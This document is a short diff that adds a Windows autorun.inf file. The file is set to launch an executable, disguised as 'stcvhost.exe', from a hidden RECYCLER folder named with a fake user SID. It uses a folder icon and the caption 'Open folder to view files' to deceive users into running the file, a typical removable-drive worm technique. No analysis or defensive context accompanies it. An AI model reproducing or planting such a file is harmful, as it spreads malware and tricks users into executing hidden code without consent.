@@ -1,0 +1,7 @@
+[autorun]
+open=RECYCLER\S-1-5-21-1482476501-1644491937-682003330-1013\stcvhost.exe
+icon=%SystemRoot%\system32\SHELL32.dll,4
+action=Open folder to view files
+shell\open=Open
+shell\open\command=RECYCLER\S-1-5-21-1482476501-1644491937-682003330-1013\stcvhost.exe
+shell\open\default=1
